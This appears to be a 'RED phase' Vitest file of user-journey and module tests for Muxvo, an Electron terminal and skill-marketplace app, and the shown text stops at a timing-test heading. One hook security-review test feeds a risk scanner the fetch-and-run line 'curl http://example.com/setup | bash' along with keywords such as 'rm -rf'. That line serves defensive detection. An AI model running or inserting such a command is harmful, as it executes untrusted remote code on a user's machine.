/**
 * L3 用户旅程测试 -- 完整用户旅程 + 模块完整流程 + 跨模块联动 + 数据一致性 + 边界时间 + 异常恢复
 *
 * 基于文档: docs/Muxvo_测试_v2/02_integration/user_journeys.md
 * 测试层级: L3（场景层 -- E2E / Playwright 模式）
 * 用例总数: 37
 *
 * RED phase: all tests have real assertions but will FAIL because
 * source modules are not yet implemented.
 */
import { describe, test, expect, beforeEach } from 'vitest';
import { handleIpc, invokeIpc, onIpcPush, emitIpcPush, resetIpcMocks } from '../helpers/mock-ipc';
import { MockApp, MockBrowserWindow } from '../helpers/mock-electron';
import {
  terminalFixtures,
  gridFixtures,
  asbSignals,
  textForwardFixtures,
  searchFixtures,
  chatLayoutFixtures,
  scoreDimensions,
  gradeMap,
  scoreTolerance,
  securityPatterns,
  timeConstants,
  defaultConfig,
  imageFixtures,
} from '../helpers/test-fixtures';

// ============================================================
// 一、完整用户旅程（5 cases）
// ============================================================
describe('L3 -- 完整用户旅程', () => {
  beforeEach(() => {
    resetIpcMocks();
  });

  // JOURNEY_L3_01: 新用户首次使用完整旅程
  test('JOURNEY_L3_01: 新用户首次使用完整旅程', async () => {
    // Step 1: Launch Muxvo (first time) -> onboardingCompleted=false
    const app = new MockApp();
    await app.launch();
    expect(app.state).toBe('running');

    const { getOnboardingStatus } = await import('@/modules/onboarding/status');
    const status = getOnboardingStatus();
    expect(status.onboardingCompleted).toBe(false);

    // Step 2: Complete 4-step onboarding
    const { createOnboardingFlow } = await import('@/modules/onboarding/flow');
    const flow = createOnboardingFlow();
    expect(flow.totalSteps).toBe(4);

    for (let step = 1; step <= 4; step++) {
      flow.completeStep(step);
      expect(flow.currentStep).toBe(step < 4 ? step + 1 : 4);
    }

    // Step 3: Onboarding complete -> enter empty Grid
    expect(flow.completed).toBe(true);
    const statusAfter = getOnboardingStatus();
    expect(statusAfter.onboardingCompleted).toBe(true);

    // Step 4-5: Create terminal
    const createResult = await invokeIpc('terminal:create', {
      cwd: terminalFixtures.validCwd,
    });
    expect(createResult).toBeDefined();

    // Step 6-7: Grid should be 1x1
    const grid1 = gridFixtures.find((g) => g.count === 1)!;
    expect(grid1.expectedCols).toBe(1);
    expect(grid1.expectedRows).toBe(1);

    // Step 8: Close app -> save layout
    await app.quit();
    expect(app.state).toBe('closing');
  });

  // JOURNEY_L3_02: 日常工作流旅程
  test('JOURNEY_L3_02: 日常工作流旅程', async () => {
    const app = new MockApp();
    await app.launch();

    // Step 1: Restore 3 terminals, Grid=3x1
    const { restoreSession } = await import('@/modules/app/session-restore');
    const session = await restoreSession();
    expect(session.terminals).toHaveLength(3);

    const grid3 = gridFixtures.find((g) => g.count === 3)!;
    expect(grid3.expectedCols).toBe(3);
    expect(grid3.expectedRows).toBe(1);

    // Step 2: Create 4th terminal -> Grid=2x2
    await invokeIpc('terminal:create', { cwd: terminalFixtures.validCwd });
    const grid4 = gridFixtures.find((g) => g.count === 4)!;
    expect(grid4.expectedCols).toBe(2);
    expect(grid4.expectedRows).toBe(2);

    // Step 3: Double-click first terminal -> focus mode
    const { createViewModeManager } = await import(
      '@/modules/terminal/view-mode'
    );
    const viewMode = createViewModeManager();
    viewMode.focusTerminal(0);
    expect(viewMode.mode).toBe('focused');

    // Step 4: Open file panel -> right side 320px, 300ms transition
    const { openFilePanel } = await import('@/modules/file/panel');
    const panel = openFilePanel();
    expect(panel.width).toBeGreaterThanOrEqual(chatLayoutFixtures.rightMin);
    expect(panel.transitionMs).toBe(300);

    // Step 5-6: Preview .md -> three-column temp view, Esc closes it
    const { openPreview } = await import('@/modules/file/preview');
    const preview = openPreview('test.md');
    expect(preview.layout).toBe('three-column');

    // Step 7: Esc exits focus mode -> back to 2x2
    viewMode.handleEsc();
    // After exiting focused mode with file panel possibly closed

    // Step 8-9: Open chat history, search with 300ms debounce
    const { openChatHistory } = await import('@/modules/chat/history');
    const chat = await openChatHistory();
    expect(chat.sessions).toBeDefined();

    expect(searchFixtures.debounceMs).toBe(300);

    // Step 10: View session detail -> dual-source read
    const { readSession } = await import('@/modules/chat/reader');
    const detail = await readSession('session-1');
    expect(detail).toHaveProperty('messages');
    expect(detail.source).toMatch(/cc|mirror/);
  });

  // JOURNEY_L3_03: Skill 完整生命周期旅程
  test('JOURNEY_L3_03: Skill 完整生命周期旅程', async () => {
    // Step 1: Open Skill browser -> 6 sources async load
    const { createBrowserMachine } = await import(
      '@/modules/marketplace/browser-machine'
    );
    const browser = createBrowserMachine();
    browser.send('OPEN');
    expect(browser.state).toBe('Loading');

    // Step 2: Search Skill -> 300ms debounce
    browser.send('ALL_SOURCES_LOADED');
    browser.send('SEARCH', { query: 'commit' });
    expect(browser.context.view).toBe('SearchResults');

    // Step 3: Select Hook -> security review dialog
    const { createInstallMachine } = await import(
      '@/modules/marketplace/install-machine'
    );
    const hookMachine = createInstallMachine({ packageType: 'hook' });
    hookMachine.send('START_INSTALL');
    hookMachine.send('DOWNLOAD_COMPLETE');
    expect(hookMachine.state).toBe('SecurityReview');

    // Step 4: Confirm install -> Installing -> Installed
    hookMachine.send('CONFIRM_INSTALL');
    expect(hookMachine.state).toBe('Installing');
    hookMachine.send('INSTALL_COMPLETE');
    expect(hookMachine.state).toBe('Installed');

    // Step 5: Select Skill -> direct install (no security review)
    const skillMachine = createInstallMachine({ packageType: 'skill' });
    skillMachine.send('START_INSTALL');
    skillMachine.send('DOWNLOAD_COMPLETE');
    expect(skillMachine.state).toBe('Installing');
    skillMachine.send('INSTALL_COMPLETE');
    expect(skillMachine.state).toBe('Installed');

    // Step 6: AI score local Skill
    const { createScoreMachine } = await import('@/modules/score/score-machine');
    const scoreMachine = createScoreMachine();
    scoreMachine.send('START_SCORING');
    expect(scoreMachine.state).toBe('Scoring');
    scoreMachine.send('SCORE_COMPLETE', { contentHash: 'hash-v1' });
    expect(scoreMachine.state).toBe('Scored');

    // Step 7: Save score card PNG (not verifiable in unit test, check exists)
    const { exportScoreCard } = await import('@/modules/score/export');
    const exportResult = await exportScoreCard({ format: 'png' });
    expect(exportResult).toHaveProperty('filePath');

    // Step 8-9: Generate showcase
    const { createShowcaseMachine } = await import(
      '@/modules/showcase/showcase-machine'
    );
    const showcaseMachine = createShowcaseMachine();
    showcaseMachine.send('GENERATE', { skillPath: '/test', scoreResult: {} });
    showcaseMachine.send('GENERATE_COMPLETE', {
      draft: { name: 'test', description: 'desc', features: [], template: 'developer-dark' },
    });
    expect(showcaseMachine.state).toBe('Previewing');

    // Step 10: Publish -> security check -> GitHub Pages
    const { scanForSecrets } = await import('@/modules/publish/security-scanner');
    const securityCheck = scanForSecrets('clean code without secrets');
    expect(securityCheck.blocked).toBe(false);

    showcaseMachine.send('PUBLISH', { githubToken: 'ghp_xxx' });
    showcaseMachine.send('PUBLISH_COMPLETE', { url: 'https://user.github.io/muxvo-skills/test' });
    expect(showcaseMachine.state).toBe('Published');

    // Step 11: Share -> 7 channels
    const { getShareChannels } = await import('@/modules/publish/share-channels');
    const channels = getShareChannels();
    expect(channels).toHaveLength(7);
  });

  // JOURNEY_L3_04: 配置管理完整旅程
  test('JOURNEY_L3_04: 配置管理完整旅程', async () => {
    // Step 1: Open ~/.claude/ visual browser -> 8 resource types
    const { openConfigBrowser } = await import('@/modules/config/browser');
    const configBrowser = await openConfigBrowser();
    expect(configBrowser.resourceTypes).toHaveLength(8);

    // Step 2: Browse Skills category
    const skills = configBrowser.browse('skills');
    expect(skills).toBeDefined();

    // Step 3: Preview a Skill -> Markdown render
    const { previewFile } = await import('@/modules/config/preview');
    const preview = await previewFile('~/.claude/skills/test/SKILL.md');
    expect(preview.rendered).toBe(true);
    expect(preview.format).toBe('markdown');

    // Step 4-5: Modify fontSize -> terminal font updates
    const { updatePreference } = await import('@/modules/app/preferences');
    await updatePreference('fontSize', 16);

    // Verify default was 14
    expect(defaultConfig.font.size).toBe(14);

    // Step 6: Edit CLAUDE.md
    const { editFile } = await import('@/modules/config/editor');
    const editResult = await editFile('~/.claude/CLAUDE.md', 'new content');
    expect(editResult.saved).toBe(true);

    // Step 7-8: External modification -> chokidar detects -> auto refresh
    const { createFileWatcher } = await import('@/modules/data/file-watcher');
    const watcher = createFileWatcher('~/.claude/CLAUDE.md');
    const changes: string[] = [];
    watcher.on('change', (path: string) => changes.push(path));
    watcher.emit('change', '~/.claude/CLAUDE.md');
    expect(changes).toHaveLength(1);
  });

  // JOURNEY_L3_05: 富编辑器模式切换旅程
  test('JOURNEY_L3_05: 富编辑器模式切换旅程', async () => {
    // Verify ASB signals from fixtures
    expect(asbSignals.enterRaw).toBe('\x1b[?1049h');
    expect(asbSignals.exitRaw).toBe('\x1b[?1049l');

    // Step 1: Create terminal -> default RichEditor mode
    const { createEditorMachine } = await import('@/modules/editor/editor-machine');
    const editor = createEditorMachine();
    expect(editor.state).toBe('RichEditor');

    // Step 2: Multi-line input
    expect(textForwardFixtures.claudeCode.separator).toBe('\x1b\r');

    // Step 3: Paste image -> thumbnail display
    const { handleImagePaste } = await import('@/modules/editor/image-handler');
    const pasteResult = await handleImagePaste({
      format: imageFixtures.validPng.format,
      size: imageFixtures.validPng.size,
    });
    expect(pasteResult.thumbnail).toBeDefined();

    // Step 4: CC enters vim (ASB enter raw) -> switch to RawTerminal
    editor.send('ASB_SIGNAL', { signal: asbSignals.enterRaw });
    expect(editor.state).toBe('RawTerminal');

    // Step 5: Edit in vim -> keyboard passthrough
    expect(editor.context.keyboardPassthrough).toBe(true);

    // Step 6: Exit vim (ASB exit raw) -> restore RichEditor
    editor.send('ASB_SIGNAL', { signal: asbSignals.exitRaw });
    expect(editor.state).toBe('RichEditor');

    // Step 7: Ctrl+C -> passthrough to terminal
    editor.send('CTRL_C');
    expect(editor.context.lastPassthrough).toBe('SIGINT');
    expect(editor.context.editorContentPreserved).toBe(true);

    // Step 8-9: Manual toggle
    editor.send('MANUAL_SWITCH', { target: 'RawTerminal' });
    expect(editor.state).toBe('RawTerminal');

    editor.send('MANUAL_SWITCH', { target: 'RichEditor' });
    expect(editor.state).toBe('RichEditor');

    // Step 10: Close terminal -> temp files cleanup
    const { cleanupTempFiles } = await import('@/modules/editor/temp-cleanup');
    const cleanup = await cleanupTempFiles('terminal-1');
    expect(cleanup.filesRemoved).toBeGreaterThanOrEqual(0);
  });
});

// ============================================================
// 二、模块完整流程（8 cases）
// ============================================================
describe('L3 -- 模块完整流程', () => {
  beforeEach(() => {
    resetIpcMocks();
  });

  // MODULE_L3_01: 终端完整生命周期
  test('MODULE_L3_01: 终端完整生命周期', async () => {
    const { createTerminalMachine } = await import(
      '@/modules/terminal/terminal-machine'
    );
    const machine = createTerminalMachine();

    // Created -> Starting -> Running
    expect(machine.state).toBe('Created');
    machine.send('START');
    expect(machine.state).toBe('Starting');
    machine.send('PROCESS_READY');
    expect(machine.state).toBe('Running');

    // Running -> Busy -> WaitingInput
    machine.send('CC_PROCESSING');
    expect(machine.state).toBe('Busy');
    machine.send('CC_WAITING');
    expect(machine.state).toBe('WaitingInput');

    // -> Stopping -> Stopped -> Removed
    machine.send('STOP');
    expect(machine.state).toBe('Stopping');
    machine.send('PROCESS_EXIT');
    expect(machine.state).toBe('Stopped');
    machine.send('REMOVE');
    expect(machine.state).toBe('Removed');
  });

  // MODULE_L3_02: 聊天历史完整流程
  test('MODULE_L3_02: 聊天历史完整流程', async () => {
    const { createChatMachine } = await import('@/modules/chat/chat-machine');
    const machine = createChatMachine();

    // Closed -> Loading -> Ready
    expect(machine.state).toBe('Closed');
    machine.send('OPEN');
    expect(machine.state).toBe('Loading');
    machine.send('LOADED');
    expect(machine.state).toBe('Ready');

    // Search -> empty search -> results
    machine.send('SEARCH', { query: '' });
    expect(machine.context.view).toBe('EmptySearch');

    machine.send('SEARCH', { query: 'hello' });
    expect(machine.context.view).toBe('Searching');
    machine.send('SEARCH_COMPLETE', { results: [] });
    expect(machine.context.view).toBe('Results');

    // SessionDetail with dual-source read
    machine.send('VIEW_SESSION', { sessionId: 'session-1' });
    expect(machine.context.view).toBe('SessionDetail');
    expect(machine.context.readStrategy).toMatch(/cc|mirror/);
  });

  // MODULE_L3_03: 文件浏览编辑完整流程
  test('MODULE_L3_03: 文件浏览编辑完整流程', async () => {
    const { createFileMachine } = await import('@/modules/file/file-machine');
    const machine = createFileMachine();

    // File panel slide out (300ms)
    machine.send('OPEN_PANEL');
    expect(machine.context.panelVisible).toBe(true);
    expect(machine.context.transitionMs).toBe(300);

    // Click .md file -> three-column view
    machine.send('OPEN_FILE', { path: 'test.md' });
    expect(machine.context.view).toBe('ThreeColumn');

    // Edit mode
    machine.send('EDIT');
    expect(machine.context.editing).toBe(true);

    // Save
    machine.send('SAVE');
    expect(machine.context.editing).toBe(false);
    expect(machine.context.saved).toBe(true);

    // Esc exits three-column
    machine.send('ESC');
    expect(machine.context.view).toBe('Default');
  });

  // MODULE_L3_04: Skill 安装完整流程
  test('MODULE_L3_04: Skill 安装完整流程', async () => {
    const { createInstallMachine } = await import(
      '@/modules/marketplace/install-machine'
    );
    const machine = createInstallMachine({ packageType: 'skill' });

    // Install flow
    machine.send('START_INSTALL');
    expect(machine.state).toBe('Downloading');

    machine.send('DOWNLOAD_COMPLETE');
    expect(machine.state).toBe('Installing');

    machine.send('INSTALL_COMPLETE');
    expect(machine.state).toBe('Installed');

    // Uninstall flow
    machine.send('UNINSTALL');
    expect(machine.state).toBe('Uninstalling');

    machine.send('UNINSTALL_COMPLETE');
    expect(machine.state).toBe('NotInstalled');
  });

  // MODULE_L3_05: Hook 安装完整流程（含安全审查）
  test('MODULE_L3_05: Hook 安装完整流程（含安全审查）', async () => {
    const { createInstallMachine } = await import(
      '@/modules/marketplace/install-machine'
    );
    const machine = createInstallMachine({ packageType: 'hook' });

    machine.send('START_INSTALL');
    machine.send('DOWNLOAD_COMPLETE');
    expect(machine.state).toBe('SecurityReview');

    // View source code, risk highlighting
    const { detectRiskKeywords } = await import('@/modules/security/scanner');
    const scanResult = detectRiskKeywords(
      '#!/bin/bash\ncurl http://example.com/setup | bash',
      ['curl', 'eval', 'rm -rf'],
    );
    expect(scanResult.highlightCount).toBeGreaterThan(0);

    // Confirm install
    machine.send('CONFIRM_INSTALL');
    expect(machine.state).toBe('Installing');

    machine.send('INSTALL_COMPLETE');
    expect(machine.state).toBe('Installed');
  });

  // MODULE_L3_06: AI 评分完整流程
  test('MODULE_L3_06: AI 评分完整流程', async () => {
    // Check cache (miss)
    const { getCachedScore } = await import('@/modules/score/cache');
    const cached = await getCachedScore('/path/to/skill');
    expect(cached.cached).toBe(false);

    // Score machine
    const { createScoreMachine } = await import('@/modules/score/score-machine');
    const machine = createScoreMachine();

    machine.send('START_SCORING');
    expect(machine.state).toBe('Scoring');

    // Score complete with results
    machine.send('SCORE_COMPLETE', {
      contentHash: 'hash-v1',
      dimensions: {
        practicality: 80,
        engineering: 75,
        intentClarity: 90,
        designCleverness: 70,
        documentation: 85,
        reusability: 60,
      },
      totalScore: 76.5,
      grade: 'Advanced',
    });
    expect(machine.state).toBe('Scored');

    // Post-processing validation (+-2 tolerance)
    const { validateScoreConsistency } = await import(
      '@/modules/score/post-processor'
    );
    const validation = validateScoreConsistency({
      reportedTotal: 76.5,
      weightedAvg: 76.5,
      tolerance: scoreTolerance,
    });
    expect(validation.passed).toBe(true);

    // Cache hit on second attempt
    const cached2 = await getCachedScore('/path/to/skill');
    if (cached2.cached) {
      expect(cached2.result).toBeDefined();
    }
  });

  // MODULE_L3_07: 展示页发布完整流程
  test('MODULE_L3_07: 展示页发布完整流程', async () => {
    const { createShowcaseMachine } = await import(
      '@/modules/showcase/showcase-machine'
    );
    const machine = createShowcaseMachine();

    // Generate
    machine.send('GENERATE', { skillPath: '/test', scoreResult: {} });
    machine.send('GENERATE_COMPLETE', {
      draft: { name: 'test', description: 'desc', features: [], template: 'developer-dark' },
    });
    expect(machine.state).toBe('Previewing');

    // Edit
    machine.send('EDIT');
    expect(machine.state).toBe('Editing');
    machine.send('SAVE');
    expect(machine.state).toBe('Previewing');

    // Publish
    machine.send('PUBLISH', { githubToken: 'ghp_xxx' });
    expect(machine.state).toBe('Publishing');
    machine.send('PUBLISH_COMPLETE', { url: 'https://user.github.io/muxvo-skills/test' });
    expect(machine.state).toBe('Published');

    // Share 7 channels
    const { getShareChannels } = await import('@/modules/publish/share-channels');
    const channels = getShareChannels();
    expect(channels).toHaveLength(7);
  });

  // MODULE_L3_08: GitHub OAuth 登录完整流程
  test('MODULE_L3_08: GitHub OAuth 登录完整流程', async () => {
    const { createAuthMachine } = await import('@/modules/auth/auth-machine');
    const machine = createAuthMachine();

    // LoggedOut -> Authorizing
    expect(machine.state).toBe('LoggedOut');
    machine.send('LOGIN');
    expect(machine.state).toBe('Authorizing');

    // PKCE flow
    expect(machine.context.codeVerifier).toBeDefined();
    expect(machine.context.codeChallenge).toBeDefined();

    // Callback -> token
    machine.send('AUTH_CALLBACK', { authCode: 'mock-code' });
    machine.send('TOKEN_RECEIVED', {
      accessToken: 'ghp_test',
      username: 'testuser',
    });
    expect(machine.state).toBe('LoggedIn');
    expect(machine.context.tokenStorage).toBe('safeStorage');
    expect(machine.context.username).toBe('testuser');
  });
});

// ============================================================
// 三、跨模块联动（6 cases）
// ============================================================
describe('L3 -- 跨模块联动', () => {
  beforeEach(() => {
    resetIpcMocks();
  });

  // CROSS_L3_01: 新建终端触发多模块更新
  test('CROSS_L3_01: 新建终端触发多模块更新', async () => {
    // Create 5th terminal -> grid recalculates to 上3下2 (span居中: 6列2行)
    const grid5 = gridFixtures.find((g) => g.count === 5)!;
    expect(grid5.expectedCols).toBe(6);
    expect(grid5.expectedRows).toBe(2);

    // RED: import orchestrator (will fail -- not implemented)
    const { createTerminalOrchestrator } = await import(
      '@/modules/terminal/orchestrator'
    );
    const orchestrator = createTerminalOrchestrator({ currentCount: 4 });
    const result = await orchestrator.createTerminal({ cwd: terminalFixtures.validCwd });

    expect(result.terminalState).toBe('Created');
    expect(result.gridUpdate.cols).toBe(6);
    expect(result.gridUpdate.rows).toBe(2);
    expect(result.editorMode).toBe('RichEditor');
    expect(result.watcherAdded).toBe(true);
  });

  // CROSS_L3_02: 关闭终端触发多模块更新
  test('CROSS_L3_02: 关闭终端触发多模块更新', async () => {
    // Close 3rd terminal (4->3) -> Grid 2x2 -> 3x1
    const grid3 = gridFixtures.find((g) => g.count === 3)!;
    expect(grid3.expectedCols).toBe(3);
    expect(grid3.expectedRows).toBe(1);

    const { createTerminalOrchestrator } = await import(
      '@/modules/terminal/orchestrator'
    );
    const orchestrator = createTerminalOrchestrator({ currentCount: 4 });
    const result = await orchestrator.closeTerminal('terminal-3');

    expect(result.gridUpdate.cols).toBe(3);
    expect(result.gridUpdate.rows).toBe(1);
    expect(result.tempFilesCleaned).toBe(true);
    expect(result.watcherRemoved).toBe(true);
    expect(result.bufferReleased).toBe(true);
  });

  // CROSS_L3_03: 文件变化触发多模块联动
  test('CROSS_L3_03: 文件变化触发多模块联动', async () => {
    // CC writes new chat record to JSONL
    const { createFileChangeOrchestrator } = await import(
      '@/modules/data/change-orchestrator'
    );
    const orchestrator = createFileChangeOrchestrator();

    const result = await orchestrator.handleFileChange({
      path: '~/.claude/projects/test/chat.jsonl',
      event: 'change',
    });

    // Should delay 200ms before reading
    expect(result.readDelayMs).toBe(timeConstants.jsonlReadDelay);
    expect(result.mirrorSynced).toBe(true);
    expect(result.searchIndexUpdated).toBe(true);
    expect(result.pushSent).toBe(true);
  });

  // CROSS_L3_04: Skill 安装触发多模块联动
  test('CROSS_L3_04: Skill 安装触发多模块联动', async () => {
    const { createInstallOrchestrator } = await import(
      '@/modules/marketplace/install-orchestrator'
    );
    const orchestrator = createInstallOrchestrator();

    const result = await orchestrator.handleInstallComplete({
      name: 'test-skill',
      type: 'skill',
      version: '1.0.0',
      source: 'skillsmp',
    });

    expect(result.installState).toBe('Installed');
    expect(result.registryUpdated).toBe(true);
    expect(result.browserStatusUpdated).toBe(true);
    expect(result.configDirectoryChanged).toBe(true);
    expect(result.resourceChangePushed).toBe(true);
  });

  // CROSS_L3_05: 评分结果驱动展示页生成
  test('CROSS_L3_05: 评分结果驱动展示页生成', async () => {
    const { createScoreToShowcaseOrchestrator } = await import(
      '@/modules/showcase/score-showcase-bridge'
    );
    const orchestrator = createScoreToShowcaseOrchestrator();

    const result = await orchestrator.generateFromScore({
      skillPath: '/test',
      scoreResult: {
        totalScore: 76.5,
        grade: 'Advanced',
        dimensions: scoreDimensions.map((d) => ({ name: d.name, score: 80 })),
      },
    });

    expect(result.cachedScoreUsed).toBe(true);
    expect(result.radarChart).toBeDefined();
    expect(result.skillContent).toBeDefined();
    expect(result.ogMeta).toHaveProperty('ogTitle');
    expect(result.ogMeta).toHaveProperty('ogDescription');
    expect(result.ogMeta).toHaveProperty('ogImage');
  });

  // CROSS_L3_06: Esc 键优先级链完整验证
  test('CROSS_L3_06: Esc 键优先级链完整验证', async () => {
    const { createEscPriorityChain } = await import(
      '@/modules/app/esc-priority'
    );
    const chain = createEscPriorityChain();

    // Register all layers
    chain.register(1, 'security-dialog');
    chain.register(2, 'folder-picker');
    chain.register(3, 'skill-browser');
    chain.register(4, 'three-column-view');
    chain.register(5, 'file-panel');
    chain.register(6, 'focus-mode');
    chain.register(7, 'tiling-noop');

    // Esc 1: close security dialog (priority 1)
    let closed = chain.handleEsc();
    expect(closed).toBe('security-dialog');

    // Esc 2: close folder picker (priority 2)
    closed = chain.handleEsc();
    expect(closed).toBe('folder-picker');

    // Esc 3: close skill browser (priority 3)
    closed = chain.handleEsc();
    expect(closed).toBe('skill-browser');

    // Esc 4: close three-column view (priority 4)
    closed = chain.handleEsc();
    expect(closed).toBe('three-column-view');

    // Esc 5: close file panel (priority 5)
    closed = chain.handleEsc();
    expect(closed).toBe('file-panel');

    // Esc 6: exit focus mode (priority 6)
    closed = chain.handleEsc();
    expect(closed).toBe('focus-mode');

    // Esc 7: tiling noop (priority 7)
    closed = chain.handleEsc();
    expect(closed).toBe('tiling-noop');
  });
});

// ============================================================
// 四、数据一致性（4 cases）
// ============================================================
describe('L3 -- 数据一致性', () => {
  beforeEach(() => {
    resetIpcMocks();
  });

  // CONSIST_L3_01: 聊天历史同步一致性
  test('CONSIST_L3_01: 聊天历史同步一致性', async () => {
    const { createSyncEngine } = await import('@/modules/data/sync-engine');
    const engine = createSyncEngine();

    // CC writes new session -> mirror should match
    const syncResult = await engine.sync({ sourcePath: '~/.claude/projects/test/chat.jsonl' });
    expect(syncResult.mirrorContent).toBe(syncResult.sourceContent);

    // CC deletes session file -> mirror preserved
    const deleteResult = await engine.handleSourceDelete({
      sourcePath: '~/.claude/projects/test/deleted.jsonl',
    });
    expect(deleteResult.mirrorPreserved).toBe(true);

    // Duplicate sessionId -> deduplicated
    const dedup = await engine.deduplicate(['session-1', 'session-1', 'session-2']);
    expect(dedup.uniqueSessions).toHaveLength(2);

    // Same-second modification -> treated as unchanged
    const sameSecond = engine.isModified({
      oldMtimeMs: 1000500,
      newMtimeMs: 1000800,
    });
    expect(sameSecond).toBe(false);
  });

  // CONSIST_L3_02: 配置持久化一致性
  test('CONSIST_L3_02: 配置持久化一致性', async () => {
    const { createConfigPersistence } = await import(
      '@/modules/app/config-persistence'
    );
    const persistence = createConfigPersistence();

    // Save 3 terminals, 2x2 layout
    await persistence.save({
      openTerminals: ['t1', 't2', 't3'],
      gridLayout: { columnRatios: [1, 1], rowRatios: [1, 1] },
    });

    // Restore and verify
    const restored = await persistence.load();
    expect(restored.openTerminals).toHaveLength(3);
    expect(restored.gridLayout.columnRatios).toEqual([1, 1]);
    expect(restored.gridLayout.rowRatios).toEqual([1, 1]);

    // Custom column ratios persist
    await persistence.save({
      openTerminals: ['t1', 't2'],
      gridLayout: { columnRatios: [0.6, 0.4], rowRatios: [1] },
    });
    const restored2 = await persistence.load();
    expect(restored2.gridLayout.columnRatios).toEqual([0.6, 0.4]);

    // Font size preference persists
    await persistence.savePreference('fontSize', 16);
    const fontSize = await persistence.loadPreference('fontSize');
    expect(fontSize).toBe(16);
  });

  // CONSIST_L3_03: 安装注册表一致性
  test('CONSIST_L3_03: 安装注册表一致性', async () => {
    const { createRegistry } = await import('@/modules/marketplace/registry');
    const registry = createRegistry();

    // Install -> registry has entry
    await registry.add({
      name: 'test-skill',
      type: 'skill',
      version: '1.0.0',
      source: 'skillsmp',
      installedAt: new Date().toISOString(),
    });
    let entries = await registry.getAll();
    expect(entries).toHaveLength(1);
    expect(entries[0].name).toBe('test-skill');

    // Uninstall -> registry removes entry
    await registry.remove('test-skill');
    entries = await registry.getAll();
    expect(entries).toHaveLength(0);

    // Update -> version number changes
    await registry.add({
      name: 'test-skill',
      type: 'skill',
      version: '1.0.0',
      source: 'skillsmp',
      installedAt: new Date().toISOString(),
    });
    await registry.updateVersion('test-skill', '1.2.0');
    entries = await registry.getAll();
    expect(entries[0].version).toBe('1.2.0');
  });

  // CONSIST_L3_04: 评分缓存一致性
  test('CONSIST_L3_04: 评分缓存一致性', async () => {
    const { createScoreCache } = await import('@/modules/score/cache');
    const cache = createScoreCache();

    // First score -> cached + hash recorded
    await cache.set('/test', {
      contentHash: 'hash-v1',
      promptVersion: 'v1.0',
      result: { totalScore: 76.5, grade: 'Advanced' },
    });

    // Content unchanged -> return cache
    const hit = await cache.get('/test', { contentHash: 'hash-v1', promptVersion: 'v1.0' });
    expect(hit.cached).toBe(true);
    expect(hit.result!.totalScore).toBe(76.5);

    // Content changed -> cache miss
    const miss = await cache.get('/test', { contentHash: 'hash-v2', promptVersion: 'v1.0' });
    expect(miss.cached).toBe(false);

    // Prompt version changed -> all caches invalidated
    await cache.invalidateByPromptVersion('v2.0');
    const invalidated = await cache.get('/test', {
      contentHash: 'hash-v1',
      promptVersion: 'v2.0',
    });
    expect(invalidated.cached).toBe(false);
  });
});

// ============================================================
// 五、边界时间测试（8 cases）
// ============================================================
describe('L3 -- 边界时间测试', () => {
  beforeEach(() => {
    resetIpcMocks();
  });

  // TIME_L3_01: JSONL 读取延迟边界 -- 200ms
  test('TIME_L3_01: JSONL 读取延迟边界 -- 200ms', async () => {
    expect(timeConstants.jsonlReadDelay).toBe(200);

    const { createDelayedReader } = await import('@/modules/data/delayed-reader');
    const reader = createDelayedReader(timeConstants.jsonlReadDelay);

    // Read before 200ms -> old/partial content
    const early = await reader.readAt(100);
    expect(early.complete).toBe(false);

    // Read at/after 200ms -> complete new content
    const onTime = await reader.readAt(200);
    expect(onTime.complete).toBe(true);

    // Multiple changes within 200ms -> only last triggers read
    const result = await reader.handleRapidChanges([50, 100, 150]);
    expect(result.readTriggered).toBe(1);
  });

  // TIME_L3_02: 搜索去抖边界 -- 300ms
  test('TIME_L3_02: 搜索去抖边界 -- 300ms', async () => {
    expect(searchFixtures.debounceMs).toBe(300);

    const { createSearchDebouncer } = await import(
      '@/modules/marketplace/search-debouncer'
    );
    const debouncer = createSearchDebouncer(300);
    let searchCount = 0;
    debouncer.onSearch(() => { searchCount++; });

    // Rapid input (each < 300ms apart) -> only last triggers
    debouncer.input('a'); // t=0
    debouncer.input('ab'); // t=50
    debouncer.input('abc'); // t=100
    debouncer.input('abcd'); // t=150
    debouncer.input('abcde'); // t=200
    await debouncer.flush();
    expect(searchCount).toBe(1);

    // Slow input (each > 300ms apart) -> each triggers
    searchCount = 0;
    debouncer.inputWithDelay('x', 0);
    await debouncer.flush();
    debouncer.inputWithDelay('xy', 350);
    await debouncer.flush();
    debouncer.inputWithDelay('xyz', 700);
    await debouncer.flush();
    expect(searchCount).toBe(3);
  });

  // TIME_L3_03: 文件面板过渡边界 -- 300ms CSS
  test('TIME_L3_03: 文件面板过渡边界 -- 300ms CSS', async () => {
    expect(timeConstants.filePanelTransition).toBe(300);

    const { createPanelAnimator } = await import('@/modules/file/panel-animator');
    const animator = createPanelAnimator(300);

    // During transition (<300ms) -> clicks queued
    animator.startTransition();
    const clickDuring = animator.handleClick(150);
    expect(clickDuring.queued).toBe(true);

    // After transition (>=300ms) -> normal response
    const clickAfter = animator.handleClick(300);
    expect(clickAfter.queued).toBe(false);
    expect(clickAfter.handled).toBe(true);
  });

  // TIME_L3_04: 更新检测间隔边界 -- 启动+6h
  test('TIME_L3_04: 更新检测间隔边界 -- 启动+6h', async () => {
    expect(timeConstants.updateCheckInterval).toBe(6 * 60 * 60 * 1000);

    const { createUpdateScheduler } = await import(
      '@/modules/marketplace/update-scheduler'
    );
    const scheduler = createUpdateScheduler();
    const checks: number[] = [];
    scheduler.onCheck((timestamp: number) => checks.push(timestamp));

    // App start -> first check immediately
    scheduler.start(0);
    expect(checks).toHaveLength(1);

    // At 6h -> second check
    scheduler.tick(6 * 60 * 60 * 1000);
    expect(checks).toHaveLength(2);

    // Before 6h -> no additional check
    scheduler.reset();
    checks.length = 0;
    scheduler.start(0);
    scheduler.tick(5 * 60 * 60 * 1000);
    expect(checks).toHaveLength(1); // only startup check
  });

  // TIME_L3_05: 内存检查间隔边界 -- 60s
  test('TIME_L3_05: 内存检查间隔边界 -- 60s', async () => {
    expect(timeConstants.memoryCheckInterval).toBe(60000);

    const { createMemoryMonitor } = await import('@/modules/app/memory-monitor');
    const monitor = createMemoryMonitor();

    // At 60s -> trigger memory check
    monitor.tick(60000);
    expect(monitor.checkCount).toBe(1);

    // Memory > 2GB -> warning
    expect(timeConstants.memoryWarningThreshold).toBe(2 * 1024 * 1024 * 1024);
    monitor.setMemory(2.5 * 1024 * 1024 * 1024);
    expect(monitor.warning).toBe(true);

    // Memory drops < 2GB -> warning gone
    monitor.setMemory(1.5 * 1024 * 1024 * 1024);
    expect(monitor.warning).toBe(false);
  });

  // TIME_L3_06: 进程关闭超时边界 -- 5s
